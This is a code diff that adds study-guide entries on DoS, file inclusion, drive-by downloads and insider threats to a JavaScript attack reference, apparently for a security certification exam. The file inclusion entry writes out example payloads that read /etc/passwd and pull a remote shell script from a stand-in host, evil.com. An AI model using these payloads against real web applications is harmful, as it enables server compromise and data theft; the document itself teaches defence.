@@ -877,6 +877,15 @@ const ATTACK_DATA = [
         tags: ['TCP','half-open','connection table','domain 3']
       },
       {
+        name: 'DoS (Denial of Service)',
+        severity: 'high',
+        desc: 'A single-source attack that overwhelms a target system with traffic or requests, making it unavailable to legitimate users.',
+        howItWorks: 'Attacker floods target with traffic, connection requests, or malformed packets from one source. Types: volumetric (bandwidth exhaustion), protocol (connection table exhaustion), application layer (HTTP floods). Easier to block than DDoS since traffic comes from a single IP.',
+        mitigation: 'Rate limiting, firewall ACLs blocking the source IP, ISP-level filtering, over-provisioning resources.',
+        examTip: 'DoS = single source. DDoS = multiple distributed sources (botnet). DoS is easier to mitigate because you can block one IP. DDoS requires scrubbing services.',
+        tags: ['availability','single source','flood','domain 3']
+      },
+      {
         name: 'Man-in-the-Middle (MitM)',
         severity: 'critical',
         desc: 'Attacker secretly intercepts and potentially modifies communications between two parties who believe they are communicating directly.',
@@ -1066,6 +1075,15 @@ const ATTACK_DATA = [
         mitigation: 'Input validation (strip ../), use allowlist for file names, avoid user-controlled file paths, proper error handling.',
         examTip: 'Path traversal uses ../ to escape intended directory. Canonical path checking is the fix.',
         tags: ['file access','../','LFI','domain 4']
+      },
+      {
+        name: 'File Inclusion (LFI/RFI)',
+        severity: 'high',
+        desc: 'Exploiting insecure file inclusion functions to load unauthorized local files (LFI) or remote malicious scripts (RFI) through web application parameters.',
+        howItWorks: 'LFI: ?page=../../../etc/passwd → server reads local system files. RFI: ?page=http://evil.com/shell.php → server downloads and executes remote malicious script. PHP applications are most commonly vulnerable when include() uses user input.',
+        mitigation: 'Whitelist allowed file names, disable allow_url_include in PHP, input validation, use absolute paths, WAF rules.',
+        examTip: 'LFI reads local files (like path traversal but executes them). RFI executes remote code — more severe. Both exploit unsanitized file path parameters.',
+        tags: ['PHP','LFI','RFI','file inclusion','domain 4']
       },
       {
         name: 'Buffer Overflow',
@@ -1505,6 +1523,15 @@ const ATTACK_DATA = [
         tags: ['vulnerability','exploit','unpatched','nation-state','domain 4']
       },
       {
+        name: 'Drive-by Download',
+        severity: 'high',
+        desc: 'Automatic malware download triggered simply by visiting a compromised or malicious website — no user click required beyond loading the page.',
+        howItWorks: 'Attacker compromises a legitimate website or creates a malicious one. Injected JavaScript exploits browser or plugin vulnerabilities (unpatched Flash, PDF readers, Java). Victim visits page → exploit fires → malware downloaded and executed silently.',
+        mitigation: 'Keep browsers and plugins updated, use ad blockers/script blockers (NoScript), web filtering proxies, sandboxed browsing, disable outdated plugins.',
+        examTip: 'Drive-by download requires zero user interaction beyond visiting the page. Related to Watering Hole attacks — both use compromised/malicious websites but drive-by is passive.',
+        tags: ['browser exploit','passive','watering hole','domain 2']
+      },
+      {
         name: 'Lateral Movement',
         severity: 'critical',
         desc: 'Techniques used after initial compromise to progressively move through a network to access additional systems, data, or privileges.',
@@ -1606,7 +1633,45 @@ const ATTACK_DATA = [
         tags: ['DNS','registrar','domain hijacking','DNSSEC','domain 3']
       },
     ]
+  },
+  // ══════════════════════════════════════════════════
+  {
+    id: 'insider-threats',
+    name: 'Insider Threats',
+    icon: '🕵️',
+    color: '#ffd32a',
+    desc: 'Security threats originating from within the organization — employees, contractors, or partners who misuse their authorized access, intentionally or through negligence.',
+    attacks: [
+      {
+        name: 'Malicious Insider',
+        severity: 'critical',
+        desc: 'An employee, contractor, or partner who intentionally misuses their legitimate access to steal data, sabotage systems, or assist external attackers.',
+        howItWorks: 'Disgruntled employee exfiltrates intellectual property before resignation. Contractor plants a logic bomb. Privileged admin creates hidden backdoor accounts. Insider sells credentials to threat actors. Has authorized access so activity blends in with normal behavior.',
+        mitigation: 'User Entity Behavior Analytics (UEBA), DLP solutions, least privilege, separation of duties, mandatory vacation policy, access reviews, strict offboarding procedures.',
+        examTip: 'Malicious insider is the hardest threat to detect — activity looks authorized. Key controls: UEBA (detects behavioral anomalies), DLP (catches exfiltration), separation of duties (limits what any one person can do alone).',
+        tags: ['insider','intentional','DLP','UEBA','domain 2']
+      },
+      {
+        name: 'Negligent Insider',
+        severity: 'medium',
+        desc: 'An employee who unintentionally causes a security incident through careless actions — clicking phishing links, misconfiguring systems, or mishandling sensitive data.',
+        howItWorks: 'Employee clicks phishing link → installs malware. Developer commits API keys to public GitHub repo. Admin misconfigures S3 bucket to public. Employee loses unencrypted laptop with PII. No malicious intent — poor security hygiene or lack of awareness.',
+        mitigation: 'Security awareness training, phishing simulations, data handling policies, technical controls (DLP, endpoint encryption), configuration management tools.',
+        examTip: 'Negligent insider = accidental, not malicious. The majority of insider incidents are negligent. Security awareness training is the primary countermeasure.',
+        tags: ['insider','accidental','training','human error','domain 2']
+      },
+      {
+        name: 'Third-Party / Contractor Risk',
+        severity: 'high',
+        desc: 'Security risks from vendors, contractors, or partners who have authorized access but fall outside the organization\'s direct security controls.',
+        howItWorks: 'Vendor VPN credentials compromised → attacker pivots into internal network (SolarWinds pattern). Contractor with excessive permissions accesses data beyond job scope. Third-party software introduces vulnerable code into supply chain.',
+        mitigation: 'Vendor risk assessments, least privilege for third-party access, time-limited credentials, network segmentation for vendor connections, contractual security requirements, regular audits.',
+        examTip: 'Third-party risk is distinct from employee insider threat. Controls: VPN with MFA, time-limited access windows, vendor security assessments, and contractual SLAs for security standards.',
+        tags: ['vendor','contractor','third-party','VPN','domain 2']
+      },
+    ]
   }
+
 ];
 
 // ════════════════════════════════════════════════════════════════
